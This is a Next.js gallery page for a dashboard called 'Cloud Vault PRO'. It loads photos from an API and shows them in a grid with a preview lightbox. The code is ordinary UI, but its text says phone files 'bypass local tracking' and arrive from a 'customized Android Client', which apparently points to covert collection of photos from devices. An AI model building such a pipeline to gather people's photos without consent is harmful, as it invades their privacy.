'use client';

import React, { useEffect, useState } from 'react';

interface Photo {
  id: string;
  fileName: string;
  uploadedAt: string;
  url: string; // API থেকে আসা Base64 URL বা পাথ
}

export default function GalleryPage() {
  const [photos, setPhotos] = useState<Photo[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [selectedPhoto, setSelectedPhoto] = useState<Photo | null>(null);

  useEffect(() => {
    async function fetchPhotos() {
      try {
        const res = await fetch('/api/photos');
        const data = await res.json();
        
        // Next.js API রুট থেকে সরাসরি অ্যারে রিটার্ন হলে সরাসরি সেট হবে
        if (Array.isArray(data)) {
          setPhotos(data);
        } else if (data.success && Array.isArray(data.photos)) {
          setPhotos(data.photos);
        }
      } catch (err) {
        console.error("Failed to load photos", err);
      } finally {
        setLoading(false);
      }
    }
    fetchPhotos();
  }, []);

  return (
    <div className="min-h-screen bg-[#070a13] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-[#101a35] via-[#070a13] to-[#03050a] text-white font-sans selection:bg-blue-500 selection:text-white">
      
      {/* Premium Ambient Background Glows */}
      <div className="absolute top-0 left-1/4 w-96 h-96 bg-blue-500/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute top-1/3 right-1/4 w-96 h-96 bg-cyan-500/5 rounded-full blur-[150px] pointer-events-none" />

      {/* Top Header / Navbar */}
      <header className="border-b border-blue-500/10 bg-[#070a13]/70 backdrop-blur-xl sticky top-0 z-40 px-6 py-4 flex justify-between items-center transition-all">
        <div className="flex items-center space-x-4">
          {/* Cyberpunk Blue Glowing Icon */}
          <div className="h-11 w-11 rounded-xl bg-gradient-to-tr from-blue-600 via-blue-500 to-cyan-400 flex items-center justify-center shadow-[0_0_20px_rgba(59,130,246,0.4)] ring-1 ring-white/20">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-white drop-shadow-md" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
            </svg>
          </div>
          <div>
            <h1 className="text-2xl font-black tracking-tight bg-gradient-to-r from-white via-blue-200 to-cyan-300 bg-clip-text text-transparent">
              CLOUD VAULT <span className="text-xs font-mono px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 border border-blue-500/30 ml-1">PRO</span>
            </h1>
            <p className="text-xs text-blue-400/60 font-mono tracking-wider">backupph.vercel.app</p>
          </div>
        </div>

        <div className="text-sm bg-blue-950/30 border border-blue-500/20 backdrop-blur-md px-5 py-2.5 rounded-xl text-blue-300 shadow-[inset_0_1px_1px_rgba(255,255,255,0.05)] flex items-center space-x-2">
          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
          <span>Live Sync:</span> 
          <span className="font-mono font-bold text-white bg-blue-500/30 px-2 py-0.5 rounded-md ml-1">{photos.length}</span>
        </div>
      </header>

      {/* Main Content Dashboard */}
      <main className="max-w-7xl mx-auto px-6 py-12 relative z-10">
        
        {/* Welcome Section */}
        <div className="mb-12 border-l-4 border-blue-500 pl-6 py-2 bg-gradient-to-r from-blue-500/5 to-transparent rounded-r-xl">
          <h2 className="text-3xl md:text-4xl font-black tracking-tight text-white">
            Secure Database <span className="bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent">Dashboard</span>
          </h2>
          <p className="text-gray-400 mt-2 text-sm md:text-base max-w-2xl">
            All your mobile files bypass local tracking and stream directly into your secure MongoDB cluster seamlessly.
          </p>
        </div>

        {/* Loading State */}
        {loading && (
          <div className="flex flex-col items-center justify-center py-32 space-y-4">
            <div className="relative w-16 h-16">
              <div className="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-t-blue-500 border-r-cyan-400 rounded-full animate-spin"></div>
            </div>
            <p className="text-blue-300/80 text-sm font-mono tracking-widest animate-pulse">ESTABLISHING SECURE DATABASE UPLINK...</p>
          </div>
        )}

        {/* Empty State */}
        {!loading && photos.length === 0 && (
          <div className="text-center py-28 border border-dashed border-blue-500/20 rounded-3xl bg-[#090f1f]/60 backdrop-blur-sm max-w-xl mx-auto shadow-2xl">
            <div className="w-16 h-16 mx-auto rounded-2xl bg-blue-950/50 flex items-center justify-center mb-5 border border-blue-900/30">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-blue-400/60" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
              </svg>
            </div>
            <h3 className="text-xl font-bold text-gray-200">No Assets Syncing</h3>
            <p className="text-gray-400 text-sm mt-2 max-w-xs mx-auto">
              Please trigger the storage pipeline from your customized Android Client.
            </p>
          </div>
        )}

        {/* Premium High Quality Photo Grid */}
        {!loading && photos.length > 0 && (
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 animate-[fadeIn_0.6s_ease-out]">
            {photos.map((photo) => (
              <div 
                key={photo.id} 
                onClick={() => setSelectedPhoto(photo)}
                className="group relative bg-[#0b1224] border border-blue-500/10 rounded-2xl overflow-hidden hover:border-blue-500/40 transition-all duration-500 hover:-translate-y-1.5 cursor-pointer shadow-lg hover:shadow-[0_15px_35px_rgba(59,130,246,0.2)] flex flex-col justify-between"
              >
                {/* Image Wrap */}
                <div className="aspect-[4/3] w-full bg-[#111a33] overflow-hidden relative border-b border-blue-500/5">
                  <img 
                    src={photo.url} 
                    alt={photo.fileName}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700 ease-out"
                    loading="lazy"
                  />
                  {/* Glassmorphic Layer on Hover */}
                  <div className="absolute inset-0 bg-gradient-to-t from-[#070a13] via-transparent to-transparent opacity-40 group-hover:opacity-80 transition-opacity duration-300" />
                  
                  {/* Quick Expand Button Visual Overlay */}
                  <div className="absolute top-3 right-3 p-2 rounded-xl bg-[#070a13]/60 backdrop-blur-md border border-white/10 opacity-0 group-hover:opacity-100 transition-all duration-300 transform scale-75 group-hover:scale-100">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 4l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5v-4m0 4h-4m4 0l-5-5" />
                    </svg>
                  </div>
                </div>

                {/* Info Footer */}
                <div className="p-4 bg-gradient-to-b from-[#0b1224] to-[#070b16]">
                  <p className="text-sm font-semibold text-gray-200 truncate group-hover:text-blue-400 transition-colors duration-300">
                    {photo.fileName || 'Asset Object String'}
                  </p>
                  <div className="flex justify-between items-center mt-2 pt-2 border-t border-blue-500/5">
                    <p className="text-[11px] font-mono text-gray-500">
                      {new Date(photo.uploadedAt).toLocaleDateString('en-US', {
                        month: 'short', day: 'numeric', year: 'numeric'
                      })}
                    </p>
                    <p className="text-[10px] font-mono text-blue-400/70 bg-blue-500/10 px-2 py-0.5 rounded border border-blue-500/20">
                      MONGODB
                    </p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </main>

      {/* Premium Lightbox Modal for Photo Preview */}
      {selectedPhoto && (
        <div 
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-md p-4 transition-all animate-[fadeIn_0.2s_ease-out]"
          onClick={() => setSelectedPhoto(null)}
        >
          <button className="absolute top-6 right-6 text-white/70 hover:text-white bg-white/5 hover:bg-white/10 p-3 rounded-full transition-all border border-white/10">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          
          <div 
            className="max-w-4xl max-h-[85vh] overflow-hidden rounded-2xl border border-white/10 shadow-2xl relative bg-[#070a13]"
            onClick={(e) => e.stopPropagation()}
          >
            <img 
              src={selectedPhoto.url} 
              alt={selectedPhoto.fileName} 
              className="max-w-full max-h-[75vh] object-contain mx-auto"
            />
            <div className="p-4 bg-[#0b1224] border-t border-white/5 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2">
              <p className="text-sm font-mono text-gray-300 truncate max-w-md">{selectedPhoto.fileName}</p>
              <span className="text-xs text-gray-500 font-mono">
                Uploaded: {new Date(selectedPhoto.uploadedAt).toLocaleString()}
              </span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}